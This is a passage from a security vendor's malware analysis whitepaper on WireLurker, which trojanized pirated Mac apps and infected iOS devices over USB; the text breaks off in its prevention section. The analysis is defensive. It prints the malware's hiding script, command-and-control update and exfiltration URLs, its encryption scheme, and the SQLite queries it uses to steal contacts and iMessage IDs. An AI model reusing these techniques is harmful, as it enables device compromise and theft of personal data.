We believe that this malware family\nheralds a new era in malware across Apple’s desktop and mobile platforms based on\nthe following characteristics:\n\n   - Of known malware families distributed through trojanized / repackaged OS X\napplications, the biggest in scale we have ever seen\n\n   - Only the second known malware family that attacks iOS devices through OS X\nvia USB\n\n   - First malware to automate generation of malicious iOS applications, through\nbinary file replacement\n\n   - First known malware that can infect installed iOS applications similar to a\ntraditional virus\n\n   - First in-the-wild malware to install third-party applications on non-jailbroken\niOS devices through enterprise provisioning\n\nWireLurker was used to trojanize 467 OS X applications on the Maiyadi App Store, a\nthird-party Mac application store in China. In the past six months, these 467 infected\napplications were downloaded over 356,104 times and may have impacted hundreds\nof thousands of users.\n\nWireLurker monitors any iOS device connected via USB with an infected OS X\ncomputer and installs downloaded third-party applications or automatically generated\nmalicious applications onto the device, regardless of whether it is jailbroken. This is\nthe reason we call it “wire lurker”. Researchers have demonstrated similar methods\nto attack non-jailbroken devices before; however, this malware combines a number of\ntechniques to successfully realize a new breed of threat to all iOS devices.\nWireLurker exhibits complex code structure, multiple component versions, file\nhiding, code obfuscation and customized encryption to thwart anti-reversing. In\nthis whitepaper, we explain how WireLurker is delivered, the details of its malware\nprogression, and specifics on its operation.\n\nWe further describe WireLurker’s potential impact; methods to prevent, detect,\ncontain and remediate the threat; and Palo Alto Networks enterprise security\nplatform protections in place to counter associated risk.\n\nWireLurker is capable of stealing a variety of information from the mobile devices\nit infects and regularly requests updates from the attackers command and control\nserver. This malware is under active development and its creator’s ultimate goal is not\nyet clear.\n\n\n-----\n\n### Background\n\n#### User Reporting for this Threat\n\nQū Chāo, a developer at Tencent, initially observed WireLurker on June 1, 2014, when\nhe found highly suspicious files and processes on his Mac and iPhone (Figure 1).\n\nFIGURE 1  +  Report of strange apps appearing on a non-jailbroken iPhone\n\nNine days later, a thread was created on a Chinese developer forum by the user\n“LeoHe”, describing anomalous findings on his iPhone. A similar thread was created\non a Chinese Apple fan forum on August 9, 2014.\n\nIn these forum threads, numerous users reported the installation of strange\napplications and the creation of enterprise provisioning profiles on their non-jailbroken\niPhones and iPads (Figure 2).\n\nFIGURE 2  +  Additional developer forum discussion regarding anomalous findings\n\nThey also mentioned launch daemons found on their Mac computers, with names\nlike “machook_damon” and “WatchProc”. Some of these same users stated that\nthey recently downloaded and installed applications from the Maiyadi App Store\n(http://app.maiyadi.com), a third party OS X and iOS application store in China.\nAs background, the Maiyadi site is a Chinese portal for Apple related news and\nresources. The Maiyadi App Store is a sub-site known to host pirated premium Mac,\niPhone, and iPad applications.\n\n\n-----\n\n#### Investigation of the Third Party App Store\n\nSome forum users specifically mentioned downloading a Mac application named\n“CleanApp” (Figure 3) from the Maiyadi App Store and suspected it might be a culprit.\n\nFIGURE 3  +  One of applications in the Maiyadi App Store infected with WireLurker\n\nIn fact, our investigation revealed that almost all of the Mac applications (totaling\n467) uploaded to the Maiyadi App Store from April 30, 2014, to June 11, 2014,\nwere trojanized/repackaged with WireLurker. These impacted applications were\ndownloaded 356,104 times, as of October 16, 2014. Table 1 lists the top 10\nWireLurker applications, ordered by number of downloads.\n\nWIRELURKER INFECTED APPLICATION NUMBER OF DOWNLOADS\n\nThe Sims 3 42,110\n\nInternational Snooker 2012 22,353\n\nPro Evolution Soccer 2014 20,800\n\nBejeweled 3 19,016\n\nAngry Birds 14,009\n\nSpider 3 12,745\n\nNBA 2K13 11,113\n\nGRID 10,820\n\nBattlefield: Bad Company 2 8,065\n\nTwo Worlds II Game of the Year Edition 6,451\n\nTABLE 1 +  Top 10 WireLurker downloads from the Maiyadi App Store (as of Oct 10, 2014)\n\n\n-----\n\nAll of the WireLurker trojanized applications included an installation interface that used\n“Pirates of the Caribbean” themed wallpaper (Figure 4). A “麦客孤独” seal and QQ\naccount number were also displayed, both of which correspond to the owner of the\nMaiyadi site. Another similarity between these installers was that their packages always\ncontained an application named “使用帮助” (“User Manual”, in English).\n\nFIGURE 4  +  Installation interface of WireLurker infected applications\n\nThese trojanized applications were hosted on two cloud storage websites, Huawei and\nBaidu, instead of on Maiyadi’s servers.\n\n### WireLurker Workflow and Malware Progression\n\nThis section summarizes WireLurker’s workflow and malware progression (Figure 5), which\nare described in further detail in subsequent sections.\n\nFIGURE 5  +  WireLurker’s workflow and malware progression\n\n\n-----\n\nWireLurker was used to trojanize pirated Mac applications that were uploaded to the\nMaiyadi App Store. Victims downloaded these applications, installed them on their OS\nX systems and ran them. On instantiation, WireLurker’s entry code was transparently\nexecuted, dropping malicious executable files, dynamic libraries and configuration files\nprior to running the original pirated application.\n\nSome of these executable files were loaded by the operating system as launch\ndaemons. One launch daemon manages connections with WireLurker’s Command\nand Control (C2) server and checks whether an updated version of the daemon was\navailable. If so, it downloads an updater package and runs an enclosed shell script to\nupdate itself. Newer versions of WireLurker employ a launch daemon that downloads\niOS applications signed with enterprise certificates and leverages custom encryption\nfor C2 communication. Yet another launch daemon is responsible for attacking iOS\ndevices connected via USB. It monitors USB connection events and upon detecting\nan iOS device ascertains its jailbreak status. This check is accomplished by trying to\nestablish a connection with the AFC2 service on the device, which if successful would\nindicate it was jailbroken. This daemon then sends a comprehensive enumeration of\ndevice information to the C2 server.\n\nFor a non-jailbroken iOS device, WireLurker simply installs iOS applications that it\ndownloads, leveraging iTunes protocols implemented by the libimobiledevice library.\nFor a jailbroken iOS device, WireLurker backs up specific applications from the\ndevice to the Mac computer and trojanizes/repackages both backed up and additional\ndownloaded applications with a malicious binary file. These altered iOS applications\nare then installed to the device through the same iTunes protocols noted above.\nAdditionally, WireLurker uploads a malicious MobileSubstrate tweak file to the device\nthrough the AFC2 service.\n\nAt this point, new application icons are visible to the user on the connected iOS device,\nwhether jailbroken or not. For a jailbroken device, malicious code is injected into\nsystem applications, querying all contact names, phone numbers and Apple IDs, and\nsending them to the C2 server along with WireLurker status information.\n\n### WireLurker Versions\n\nFrom April 30, 2014, through October 17, 2014, we observed three distinct versions of\nWireLurker. The first version (version A) consisted of the original malicious files that\nwere used to trojanize Mac applications on Maiyadi. A week later, on May 7, 2014, the\nsecond version (version B) was distributed through WireLurker’s C2 server. The “v”\nparameter of a URL found in its code supports that this is indeed the second version\nfrom the attacker’s point of view (Figure 6). Then, prior to August 2014, the C2 server\nbegan distributing the third version (version C). The content of this latest updating\nscript confirmed it was the successor of version B.\n\n\n-----\n\nFIGURE 6  + WireLurker version information embedded in a URL found in binary\n\nExamination of the differences between these three versions of code demonstrates\nprogressive refinement:\n\n   - Version A neither downloads nor installs iOS applications to connected\ndevices and communicated with the C2 server in the clear (plaintext).\n\n   - Version B downloads and installs iOS applications, but only for jailbroken\ndevices; it also communicated with its C2 server in the clear.\n\n   - Version C downloads and installs iOS applications for both jailbroken and\nnon-jailbroken devices, and incorporated a custom encryption protocol for\nits C2 server communication.\n\nAnother significant difference between versions is found in associated malicious\nfilenames, paths and their content. WireLurker consists of dozens of malicious files\nthat can be grouped into the following categories:\n\n   - Original malicious samples which were used to trojanize Mac applications\n\n   - Dropped malicious executable files and configuration files\n\n   - Downloaded update packages from the C2 server\n\n   - Locally generated database and log files\n\n   - Downloaded IPA format iOS applications\n\n   - Malicious iOS executable files\n\n   - Malicious iOS dynamic library files\n\nFILES GROUP VERSION A TO B VERSION B TO C\n\nOriginal samples No changes.

Path and filename changes.\n\nTABLE 2  shows how these categories of files changed between versions\n\nThe filenames and SHA-1 hashes for all associated files can be found in the Appendix\nof this whitepaper.\n\n\n-----\n\n### Analysis of WireLurker OS X Malware\n\n#### Bundle Repackaging and File Hiding\n\nEvery OS X application is comprised of a bundle that contains an executable as its\nmain entry. WireLurker trojanizes OS X applications using three files: a loader, shell\nscript and ZIP archive. The first step WireLurker takes is to append an underscore\nto the original bundle executable name and then copy its malicious loader into the\nbundle to replace the original executable. As an example, given an OS X bundle with\nan executable name of “Contents/MacOS/CleanApp”, WireLurker would move the\noriginal file to “Contents/MacOS/CleanApp_” and then copy the malicious loader\nto “Contents/MacOS/CleanApp”. After executable replacement, WireLurker then\nadds a shell script, “start.sh”, and a ZIP archive, “FontMap1.cfg”, to the “Contents/\nResources” folder of the bundle.\n\nThe “hidden” flag is then set for these four files. This flag is an Apple specified file\nproperty defined at “/usr/include/sys/stat.h” as “UF_HIDDEN”. With this flag set, a\nstandard user won’t see the files in the Finder, but can still view them through the\nTerminal (Figure 7).\n\nFIGURE 7  + WireLurker hidden files within an application bundle\n\n\n-----\n\nThese operations trojanize the original application through repackaging. After the\nbundle is trojanized, the malicious loader is executed when the application is run.\nThe loader first drops an embedded script file to “/Users/Shared/run.sh”, with the\nfollowing content:\n\n```\n#!/bin/sh\n/bin/cp -rf ‘%@’ ‘%@2’\n/bin/cp -rf ‘%@_’ ‘%@’ && /usr/bin/open -a ‘%@‘\nsleep 5\n/bin/cp -rf ‘%@2’ ‘%@‘\nrm -rf ‘%@2’\n\n```\nchflags hidden ‘%@‘\n\nchflags hidden ‘%@_’\n\nrm -f /Users/Shared/run.sh\n\n\nThe text “%@” is replaced by the full path to the application’s bundle executable prior\nto being dropped. This effectively backs up the loader, restores the original bundle\nexecutable, runs it, restores the loader, and deletes the script itself. It also sets the\n“hidden” flag again for the loader and the original bundle executable.\n\nAfter dropping the above script, the loader determines whether this is the first time it\nhas been run by looking for the “/usr/local/machook/machook” file. If that file doesn’t\nexist, it performs the following actions:\n\n   - Copies the “/Resources/start.sh” and “/Resources/FontMap1.cfg” files to the\n“/Users/Shared/” folder on the Mac\n\n   - Requests system administrator privileges\n\n   - Executes “/Users/Shared/start.sh” with administrator privileges\n\nThe “start.sh” script:\n\n   - Decompresses the “FontMap1.cfg” ZIP archive to a new folder, “/usr/local/\nmachook/”\n\n  - Copies decompressed “com.apple.machook_damon.plist” and “com.apple.\nglobalupdate.plist” files to the “/Library/LaunchDaemons/” folder to register\nthem as system launch daemons\n\n  - Launches these two daemons using the launchctl command\n\n   - Copies a decompressed “globalupdate” file to the “/usr/bin/” folder\n\nThen, the loader collects the hardware serial number for the Mac and uploads it to\nthe C2 server, www[.]comeinbaby.com (Figure 8).\n\nFIGURE 8  + WireLurker uploading the hardware serial number for an OS X victim machine\n\n\n-----\n\n#### Self Update\n\nIn WireLurker version A, the dropped “globalupdate” file will be executed as a launch\ndaemon and periodically check its C2 server for a new version, using the following\nGET request:\n\n_http://www[.]comeinbaby.com/mac/getversion.php?sn=<HardwareSerialNumber>_\n\nA packet capture of this communication is shown in Figure 9.\n\nFIGURE 9  + Packet capture of WireLurker version update communication with C2 server\n\nA sample C2 server response follows:\n\n\n{“result”:{“version”:”1”,”url”:”http:\\/\\/www[.]comeinbaby.com\\/mac\\/update.zip”}}\n\n\nWhen the “version” field returns a non-zero value, WireLurker downloads the ZIP\narchive specified in the “url” field, decompresses that archive to “/usr/local/machook/\nupdate/”, and executes the enclosed “start.sh” script.\n\nWireLurker version B uses a different C2 server request to check for updates:\n\n_http://www[.]comeinbaby.com/mac/getsoft.php_\n\nIn this version, the HTTP response body contains plaintext for the “start.sh” script to\nexecute, and the temporary folder from which it runs is set to “/tmp/up”.\n\nWhen we began analysis of WireLurker, its update package contained version C. The\n“start.sh” script for this version executed a newly added “update” binary, which:\n\n    - Drops numerous new binary executable and .plist files onto the system\n\n    - Loads newly dropped .plist files as launch daemons (e.g., com.apple.\nMailServiceAgentHelper.plist)\n\n     - Deletes executable and .plist files of previous versions\n\n    - Unloads old launch daemons\n\n\n-----\n\nMost update operations are accomplished through the update binary. This file is\na Mach-O executable file header; however, a ZIP archive is appended to it (Figure\n10). The ZIP archive includes another 10 files, with their MD5 hash values used for\ncorresponding filenames.\n\nFIGURE 10  + Exploring WireLurker version C “update” binary\n\nThe 64-bit code of the “update” binary is highly obfuscated. Dynamic analysis reveals\nthat it extracts the appended ZIP package, decompresses it and moves the ten\nenclosed files to specified paths on an OS X system (Figure 11).\n\nFIGURE 11  +  Files dropped by the obfuscated “update” binary\n\n\n-----\n\nTable 3 maps each of these malicious files to their corresponding drop path. Of\nsignificant note, dea26a823839b1b3a810d5e731d76aa2 (“/usr/bin/stty5.11.pl”) is a\nMach-O universal binary executable file for ARMv7 and ARMv7s architectures. The\ndff52d100c8d69f053670a70712b0853 file is a ZIP archive that is decompressed to “/\netc/manpath.d/”. The resulting “/etc/manpath.d/libiodb.dylib” is also an ARMv7 and\nARMv7s executable file. These two ARM executable files are used for subsequent\nrepackaging of iOS applications that are then installed on iOS devices.\n\nFILENAME DROP PATH\n\n**94a933c449948514a3ce634663f9ccf8** /System/Library/LaunchDaemons/com.apple.appstore.plughelper.plist\n\n**e6e6a7845b4e00806da7d5e264eed72b** /System/Library/LaunchDaemons/com.apple.MailServiceAgentHelper.plist\n\n**fd7b1215f03ed1221065ee4508d41de3** /System/Library/LaunchDaemons/com.apple.systemkeychain-helper.plist\n\n**bda470f4568dae8cb12344a346a181d9** /System/Library/LaunchDaemons/com.apple.periodic-dd-mm-yy.plis\n\n**dca13b4ff64bcd6876c13bbb4a22f450** /usr/bin/com.apple.MailServiceAgentHelper\n\n**aa6fe189baa355a65e6aafac1e765f41** /usr/bin/periodicdate\n\n**e03402006332a6e17c36e569178d2097** /usr/bin/systemkeychain-helper\n\n**c4264b9607a68de8b9bbbe30436f5f28** /usr/bin/com.apple.appstore.PluginHelper\n\n**dea26a823839b1b3a810d5e731d76aa2** /usr/bin/stty5.11.pl\n\n**dff52d100c8d69f053670a70712b0853** Unzipped to /etc/manpath.d/\n\nTABLE 3  Drop paths for appended ZIP archive files from “update” binary\n\n#### Persistence Mechanisms\n\nWireLurker remains running as a background process, waiting for iOS devices to\ninfect over USB connections. Multiple methods and redundancy are used to achieve\nthis goal:\n\n   - Every time a user runs a WireLurker trojanized application, the loader executes\nmalicious code in the background.\n\n   - WireLurker initialization and update scripts create and load launch daemons,\nensuring persistence after reboot.\n\n   - Some WireLurker executables also load launch daemons through invoking the\nlaunchctl command (Figure 12).\n\n\n-----\n\n#### C2 Server Communication\n\nWireLurker frequently communicates with its C2 server. To date, only one C2 server has\nbeen used: www[.]comeinbaby.com (124.248.245.78). This server’s key roles follow:\n\n   - Hosts code updates for download\n\n   - Hosts iOS applications for download\n\n   - Processes reports on WireLurker status\n\n   - Accepts uploads of exfiltrated Mac and iOS device information\n\n   - Accepts uploads of exfiltrated iOS user data\n\nAs noted previously, WireLurker versions A and B communicate with the C2 server\nin plaintext over HTTP. WireLurker version C uses a customized encryption protocol\n(Figure 13).\n\nFIGURE 13  +  WireLurker version C customized encryption protocol for C2 communication\n\nReverse engineering of this encryption protocol reveals the use of the Data\nEncryption Standard (DES) algorithm in Electronic Codebook (ECB) mode with\nCryptographic Message Syntax Standard (PKCS7) padding. For each piece of TCP\ndata it receives or sends, the first 10 bytes of the data are used to generate a session\nkey. The session key is then combined with a fixed string, “dksyel”, to generate a\ndecryption key. Remaining bytes of the data are encrypted data that has also been\nencoded using Base64.\n\nWe wrote the following Python script to decrypt WireLurker version C\ncommunication data:\n\n\n-----\n\nUsing the C2 communication captured in Figure 13, the following data was sent from\nthe WireLurker C2 server to an infected OS X system over TCP:\n\n_14109439427UQZMzfWZHOiJc3FV3E5xCOZVsy2fbV+yehvSgxDHECOrxagqyva5tv9K7uL8T/_\n_FmgjvLlcWYiyHKweloJT7ts9bnl7ap93+VjncBedikuNTgWizXCFL72LXR0AEflPn1Hyw56XurjTv6KKvToZG2w==_\n\nDecryption by our script yields the following\n\n_2257b9e685e89b8c7e11f554b05cdd6819a||http://cos.myqcloud.com/1001584/_\n_ipa/7b9e685e89b8c7e11f554b05cdd6819a_\n\nWireLurker version C uses a numeric “CODE” value to identify different kinds of data\ntransmitted from client to server in C2 communications. We list all of these codes\nmapped to their data associations in the Appendix.\n\n#### iOS Application Download\n\nWireLurker version A does not download iOS applications; however, it reserves a\nfolder in “/usr/local/machook/ipa” for this functionality. Versions B and C download\nIPA files to “/usr/local/ipcc” and “/usr/share/tokenizer/ja” respectively, and store\ndownload history in local SQLite3 databases.\n\nAnalysis revealed that WireLurker version B downloaded two applications: “lszr2” and\n“pphelper”. The “lszr2” application is an iOS game developed by a Chinese company\nand the “pphelper” application is a third-party iOS App Store’s client. WireLurker\nversion C downloaded one application, “7b9e685e89b8c7e11f554b05cdd6819a”, a\ncomic reader. Filenames, display names, executable names and bundle identifiers for\nthese applications are summarized in Table 4.\n\nFile Name Display Name Executable Name Bundle Identifier\n\n**lszr2** 乱世之刃2 lszr2-yueyu com737lszr2-yueyu\n\n**pphelper** PP助手正版 PPAppInstall_qudaobao com.gzteiron.pphelper-share\n\n**7b9e685e** 漫画吧 manhua com.manhuaba.manhuajb\n**89b8c7e1**\n**1f554b05c**\n**dd6819a**\n\nTABLE 4  iOS applications downloaded by WireLurker\n\nOf note, all IPA format iOS applications downloaded by WireLurker contain an “embedded.\nmobileprovision” file in their bundle. The “ProvisionsAllDevices” key value within these\nprovisioning files is set to “true” (Figure 14), which means these files are categorized as\nenterprise provisioning and that the applications are signed by enterprise certificates.\n\nFIGURE 14  +  WireLurker downloaded applications leverage enterprise provisioning\n\n\n-----\n\nWe obtained a legal copy of the manhua application from the Apple iTunes App Store.\nIts legitimate bundle identifier is “com.manhuaba.manhua”, while the bundle identifier\nof the WireLurker version is “com.manhuaba.manhuajb”. The “jb” reference is most\nlikely an abbreviation of “jailbreak”. Otherwise, the primary difference between the\nofficial and WireLurker versions of this application are that the former doesn’t contain\nan “embedded.mobileprovision” file within its bundle. The second difference is in the\nWireLurker binary code not having been encrypted by Apple (Figure 15).\n\nFIGURE 15  +  WireLurker applications are not encrypted by Apple\n\nThe use of enterprise provisioning explains how these applications can be installed\non non-jailbroken iOS devices. Yet, on the first attempt to run a WireLurker application\non iOS, users are presented with a dialog requesting confirmation to open a\nthird-party application (Figure 16). If the user chooses to continue, a third-party\nenterprise provisioning profile will be installed and WireLurker will have successfully\ncompromised that non-jailbroken device. Furthermore, users are typically none the\nwiser, since the application otherwise operates just like the legitimate version.\n\nFIGURE 16  +  WireLurker iOS confirmation dialog and subsequent enterprise provisioning\n\n\n-----\n\n#### USB Connection Monitoring\n\nWireLurker uses a popular library called libimobiledevice to interact with iOS\ndevices through USB connections. This third-party open source software library\nimplements the iTunes protocol stack for communication between a computer and\niOS device.\n\nWireLurker registers a callback function “usbcallback(idevice_event_t const*,void *)”\nthrough the idevice_event_subscribe function provided by libimobiledevice (Figure 17).\n\nFIGURE 17  +  WireLurker callback function registration to monitor USB connections\n\nEvery time an iOS device connects or disconnects from a WireLurker infected\ncomputer, the above callback is invoked. For connections, the function fetches the iOS\ndevice’s Unique Device Identification Number (UDID) and then calls “OperatDevice(char\nconst*)” which allows a number of iOS device operations, including:\n\n   - Collection and transmission of device information to the C2 server\n\n   - Installation of malicious dynamic libraries (Substrate tweak) to a jailbroken\ndevice\n\n   - Backup of specific installed applications from a device\n\n   - Repackage of downloaded or backed-up applications to include a malicious\nARM executable file\n\n   - Installation of repackaged applications to a jailbroken device, or downloaded\napplications to a non-jailbroken device\n\n#### Exfiltration of Device Information\n\nWireLurker uses the “libimobiledevice” library interfaces to access the “lockdown”\nservice on iOS device over USB and collect the following device information (Figure 18):\n\n   - Serial number\n\n  - Phone number\n\n  - Model number\n\n   - Device type and version name\n\n   - User’s Apple ID\n\n  - UDID\n\n   - Wi-Fi address\n\n   - Disk usage information\n\n\n-----\n\nFIGURE 18  + Code showing WireLurker collecting iOS device information\n\nAll of the collected device information is concatenated into a string that is then sent\nto the C2 server.\n\n#### Installation of Malicious Dynamic Library  to an iOS Device\n\nAfter exfiltration of iOS device information, WireLurker determines the jailbroken\nstatus of the device by attempting to connect to an iOS service named AFC2 (“com.\napple.afc2”) (Figure 19). AFC2 is an additional AFC (Apple File Connection or Apple\nFile Conduit) service that is part of jailbreaking utilities for iOS devices. The daemon\nprocess of the AFC2 service runs with root permissions, allowing the service to read,\nwrite or modify any file on the iOS file system.\n\nFIGURE 19  + Code for WireLurker testing whether an iOS device is jailbroken\n\n\n-----\n\nIf the AFC2 service exists on the device, WireLurker installs /usr/local/\nmachook/sfbase.dylib” (for version B) or “/etc/manpath.d/libiodb.dylib” (for\nversion C) to “/Library/MobileSubstrate/DynamicLibraries/sfbase.dylib” on\nthe device (Figure 20). These two files contain identical content (SHA-1 hash\n461b51dd595c07f3c82be7cffc1cc77da6700605) and constitute an ARM based\nMach-O dynamic library that is a Cydia Substrate tweak. This dynamic library is\ndiscussed in more detail in the WireLurker iOS malware analysis section of this\nwhitepaper.\n\nFIGURE 20  + Installation of malicious MobileSubstrate tweak to a jailbroken iOS device\n\n#### Backup of Specific Installed Applications  from an iOS Device\n\nThe “libimobiledevice” library also provides interfaces to two standard Apple services\navailable on every iOS device: AFC and com.apple.mobile.installation_proxy. Using\nthese interfaces, WireLurker attempts to determine whether certain applications are\nalready installed on the device. If they are, it performs a backup of their IPA bundle\nfiles through the two Apple services (equivalent to a normal “application backup”\nusing iTunes). Backed up IPA bundle files are subsequently stored in the “/usr/local/\nmachook/ipa” folder and log related information is written to a local SQLite database.\nThe list of hardcoded iOS applications that WireLurker looks for follows (Figure 21):\n\n   - com.meitu.mtxx: A photo modification app, produced by Meitu\n\n   - com.taobao.taobao4iphone: The official client app of Taobao (like Ebay in\nChina), produced by Alibaba\n\n   - com.alipay.iphoneclient: The official client app of Alipay (like PayPal in China),\nproduced by Alibaba\n\nFIGURE 21  + Applications that WireLurker looks for on an iOS device\n\n\n-----\n\nWireLurker s code also revealed an unfinished stub looking for the com.tencent.mqq\napplication, which is the client app of the popular IM service QQ, produced by Tencent.\nWe anticipate the inclusion of checks for this application in future versions of WireLurker.\n\n#### Trojanizing iOS Applications\n\nWireLurker passes the device’s jailbroken status to a function named “InstallApp”,\nwhich installs downloaded IPAs or re-installs trojanized versions of the specific\napplications mentioned previously.\n\nFIGURE 22  + WireLurker infection of iOS applications\n\nIf the device is jailbroken, “InstallApp” will trojanize an iOS application before installing\nit. It accomplishes this by opening the IPA bundle as a ZIP archive, parses the “Info.\nplist” file in it to get its bundle executable filename, adds an underscore to the\nexecutable filename, and copies “/usr/local/machook/start” (for version B) or “/usr/\nbin/stty5.11.pl” (for version C) into the bundle as the original executable filename. The\n“start” and the “stty5.11.pl” files are very similar in terms of binary code and their\nfunctions are discussed in more depth in the WireLurker iOS malware analysis section.\n\n#### Installation of Trojanized iOS Applications\n\nFinally, WireLurker installs trojanized applications to connected iOS devices. For a\nnon-jailbroken device, it installs downloaded, enterprise certificate signed applications\nto the device. However, if the device is jailbroken, it trojanizes downloaded or backed\nup applications and then installs (or reinstalls) them to the device.\n\nWireLurker performs each installation by uploading the trojanized IPA bundle to the\niOS device through the AFC service and then leveraging the “instproxy_install”\ninterface of “libimobiledevice “ (Figure 23).\n\n\n-----\n\nFIGURE 23  + WireLurker installation of trojanized iOS applications\n\n\n-----\n\n### Analysis of WireLurker iOS Malware\n\nWireLurker uploads a malicious dynamic library, “sfbase.dylib”, to an iOS device and\nrepackages a malicious executable file, “start”, into iOS application bundles that it\ninstalls. This section describes how these two files operate.\n\n#### Code Injection into System Applications\n\nThe “sfbase.dylib” dynamic library acts as a Cydia MobileSubstrate tweak. The\nMobileSubstrate framework loads this dynamic library into all jailbroken iOS applications;\nhowever, this tweak focuses on the Phone, Messages, Safari, Storage Mounter,\nSearch and Preferences system applications. On initialization, it hooks the UIWindow’s\n“sendEvent:” method by invoking the MSHookMessageEx API (Figure 24).\n\nFIGURE 24  + Initialization code of sfbase.dylib iOS dynamic library\n\nThis dynamic library adds a notification observer within its “sendEvent:” hook\nfor a user pressing the home button. On detection of this event, it kills all Phone,\nMessages and Safari processes, in the background using root privileges.\n\nThis piece of hooking code is most likely still under development, since at\nthe time of this whitepaper’s publication we found unfinished methods like\n“mydUIWebViewHook hook_webView:didFinishLoadForFrame:” and “mydWebView\nwebView:shouldStartLoadWithRequest:navigationType:” which attempt to hook the\n“WebView” library for loading URLs in the background without the user’s knowledge\n(Figure 25).\n\n\n-----\n\nFIGURE 25  + Unfinished hooking code for loading URLs in the background\n\n#### Self Update\n\nBefore hooking the “sendEvent:” method, “sfbase.dylib” also connects with its\nC2 server to check for updates. It checked in with the following URL, furnishing its\ncurrent version information and the Advertising ID (ADID) of the iOS device:\n\n_http://www[.]comeinbaby.com/app/getversion.php?v=<version>&adid=<ad_id>_\n\nThis HTTP request will return the newest version number as well as the download\nURL for that version. Figure 26 shows a sample check-in and its C2 server response.\n\nFIGURE 26  + Sample check-in request and C2 server response for “sfbase.dylib” self update\n\nAll of the “sfbase.dylib” dynamic libraries we obtained from the original Maiyadi Mac\nsamples were version 4.0.2, which is also the latest version hosted on the C2 server.\nEducated guesses based on URL structure revealed two earlier versions of “sfbase.\ndylib” still hosted on the C2 server: 4.0.0 and 4.0.1.\n\nBased on these version numbers, we speculate that there may be as many as three\nother major version releases of “sfbase.dylib” used in prior attacks.\n\n\n-----\n\n#### Exfiltration of User Data\n\nIn addition to hooking system APIs, the “sfbase.dylib” dynamic library also steals\nuser data and uploads it to the C2 server. Specifically, it copies the file “/User/Library/\nAddressBook/AddressBook.sqlitedb” into the “/tmp” directory using root privileges\n(Figure 27), then executes the following SQLite query:\n\n_select m.value sphone,p.first, p.last  from ABMultiValue m,ABPerson p where m.record_id=p.rowId_\n\nFIGURE 27  + Code showing “sfbase.dylib” capturing iOS contacts information\n\nIt also copies the file “/User/Library/SMS/sms.db” into the “/tmp” directory using\nroot privileges and executes the following SQLite query to capture iMessage chats:\n\n_select distinct chat_identifier from chat where service_name=’iMessage’_\n\nThis query returns all of the iMessage IDs the user has communicated with from the\ndatabase.\n\nAfter executed the above SQLite queries, “sfbase.dylib” deletes those temporary\ndatabase copies, saves results to a local file and exfiltrates that file and Apple ID\ninformation to the C2 server, www[.]comeinbaby.com (Figure 28).\n\n\n-----\n\n#### Exfiltration of Application Usage and Device Serial Number Information\n\nWireLurker repackages iOS applications with an ARM executable file named “start”\nor “stty5.11.pl”, depending on version. This binary is a loader that collects the current\napplication’s name and device’s serial number, exfiltrates this information to the\nC2 server (Figure 29), restarts the SpringBoard, and restores the original bundle\nexecutable file (Figure 30).\n\nFIGURE 29  + Exfiltration of application and serial number information\n\nFIGURE 30 + Restoring the original bundle executable file\n\nThe exfiltration of this information is most likely used by the attacker for tracking\nWireLurker infections.\n\n\n-----\n\n### Overall Threat Analysis\n\n#### Use of Repackaging to Trojanize Applications\n\nWireLurker trojanized OS X and iOS applications using repackaging through\nexecutable file replacement. This technique is both simple to implement and\neffective. We expect to see more OS X and iOS malware employing it in the future,\nsimilar to the respective increase in malicious APK repackaging by Android malware\nauthors.\n\n#### Malicious Use of USB Connections\n\nProof of concepts for attacking non-jailbroken iOS devices over USB connections\nhave been available for some time now. In May of 2013, Mathieu Renard described\nhow to use a malicious USB accessory to install applications to iOS devices\nduring a presentation at Hackito Ergo Sum. At Black Hat 2013, Billy Lau and others\ndemonstrated a very similar attack using malicious device chargers.\n\nHowever, it wasn’t until June 24, 2014, that Kaspersky Lab found an iOS version\n**of the Mekie spyware using this technique on Windows and OS X computers in the**\nwild. WireLurker is the second malware family known to employ this strategy. The\nnotable difference between WireLurker and Mekie is that the WireLurker also targets\nnon-jailbroken iOS devices.\n\n#### Attacks Against Jailbroken Devices\n\nFrom a trending perspective, it is clear that attacks against jailbroken iOS devices will\ncontinue to increase. During 2014, six new iOS malware families targeting jailbroken\ndevices were found (three of which by Palo Alto Networks):\n\n**•** **AdThief** infected and replaced the Advertisement ID of 75,000 devices\n\n**•** **Unflod** hijacked all iTunes traffic to steal Apple IDs\n\n**•** **Mekie acted as a spyware and stole users’ Email, SMS and other IM’s log**\n\n**•** **AppBuyer** stole Apple IDs and bought apps in the background through\nemulated iTunes protocols\n\n**•** **Xsser** is a RAT spreading broadly in Hong Kong\n\n**•** **WireLurker, the subject of this whitepaper**\n\nThere are common characteristics across these malware families (except for the\nMekie), including:\n\n   - They all targeted jailbroken devices\n\n   - They all used the Cydia Substrate framework or were hosted in some\nthird-party Cydia repositories\n\n   - They all originated from China and mainly targeted Chinese users\n\n#### Attacks Against Non-Jailbroken Devices\n\nHistorically, only two malware/adware families have been confirmed as successfully\ninstalled onto non-jailbroken iOS devices: the LBTM adware in September 2010 and\n**the FindAndCall worm** in July 2012. Since Apple removed them from the official\nApp Store immediately after they were found, WireLurker is now the only known\nactive, non-jailbroken malware threat putting over 800 million iOS devices at risk.\n\n\n-----\n\nThe use of enterprise provisioning to install applications on non jailbroken devices\nis not a new concept. This technique has been widely abused by game fans and a\nnumber of Chinese application distribution platforms. Since January 2013, there have\nbeen at least five Mac/PC tools that have abused enterprise provisioning and the\n**libimobiledevice library to install pirated applications on non-jailbroken devices in**\nChina: “PP Helper”(PP助手), “KuaiYong Helper”(快用助手), “91 Mobile Helper”(91手\n机助手), “KuaiZhuang”(快装) and “SouApple”(搜苹果). It is noteworthy that the “PP\nHelper” application is also downloaded and installed by WireLurker.\n\nIn September 2014, **Tao Wei et al presented at Virus Bulletin** on the risk of abusing\nApple’s enterprise distribution program. According to their research, any application\ncan bypass Apple review, arbitrarily invoke private iOS APIs, monitor user behavior\nand exploit vulnerabilities in a non-jailbroken iOS device by leveraging an enterprise\nprovisioning profile. WireLurker is a prime example of how this is no longer a\ntheoretical risk, but an active threat as seen in the wild.\n\n#### Actor Motivation\n\nThe ultimate goal of the WireLurker attacks is not completely clear. The functionality\nand infrastructure allows the attacker to collect significant amounts of information\nfrom a large number of Chinese iOS and Mac OS systems, but none of the\ninformation points to a specific motive.\n\nAs infected devices regularly request updates from the attackers command and\ncontrol server, new features or applications could be installed at any time. It’s clear\nthe tool set is still undergoing active development and we believe WireLurker has not\nyet revealed its full functionality.\n\n### Prevention, Detection, Containment and Remediation\n\n#### Prevention\n\nThe following are our recommendations to enterprises and users regarding\nprevention or mitigation of WireLurker or similar 